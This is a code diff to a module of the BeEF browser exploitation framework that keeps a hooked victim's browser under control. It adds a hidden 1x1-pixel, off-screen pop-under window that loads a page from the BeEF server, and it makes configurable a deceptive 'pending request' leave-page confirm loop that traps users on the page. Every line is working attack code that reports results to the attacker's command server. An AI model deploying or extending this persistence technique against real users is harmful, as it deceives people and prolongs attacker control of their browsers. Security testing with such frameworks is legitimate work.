@@ -7,7 +7,7 @@
 beef.execute(function() {
 
     function display_confirm(){
-        if(confirm("Are you sure you want to navigate away from this page?\n\n There is currently a request to the server pending. You will lose recent changes by navigating away.\n\n Press OK to continue, or Cancel to stay on the current page.")){
+        if(confirm("<%= @text %>")){
             display_confirm();
         }
     }
@@ -15,20 +15,36 @@ beef.execute(function() {
     function dontleave(e){
         e = e || window.event;
 
+        var usePopUnder = '<%= @usePopUnder %>';
+        if(usePopUnder) {
+            var popunder_url = beef.net.httpproto + '://' + beef.net.host + ':' + beef.net.port + '/demos/plain.html';
+            var popunder_name = Math.random().toString(36).substring(2,10);
+            beef.debug("[Create Pop-Under] Creating window '" + popunder_name + "' for '" + popunder_url + "'");
+            beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window requested');
+            try {
+                window.open(popunder_url,popunder_name,'toolbar=0,location=0,directories=0,status=0,menubar=0,scrollbars=0,resizable=0,width=1,height=1,left='+screen.width+',top='+screen.height+'').blur();
+                window.focus();
+                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window successfully created!', beef.are.status_success());
+            } catch(e) {
+                beef.debug("[Create Pop-Under] Could not create pop-under window");
+                beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Pop-under window was not created', beef.are.status_error());
+            }
+        }
+
         if(beef.browser.isIE()){
             e.cancelBubble = true;
-            e.returnValue = "There is currently a request to the server pending. You will lose recent changes by navigating away.";
+            e.returnValue = "<%= @text %>";
         }else{
             if (e.stopPropagation) {
                 e.stopPropagation();
                 e.preventDefault();
-                e.returnValue = "There is currently a request to the server pending. You will lose recent changes by navigating away.";
+                e.returnValue = "<%= @text %>";
             }
         }
 
         //re-display the confirm dialog if the user clicks OK (to leave the page)
         display_confirm();
-        return "There is currently a request to the server pending. You will lose recent changes by navigating away.";
+        return "<%= @text %>";
     }
 
     window.onbeforeunload = dontleave;
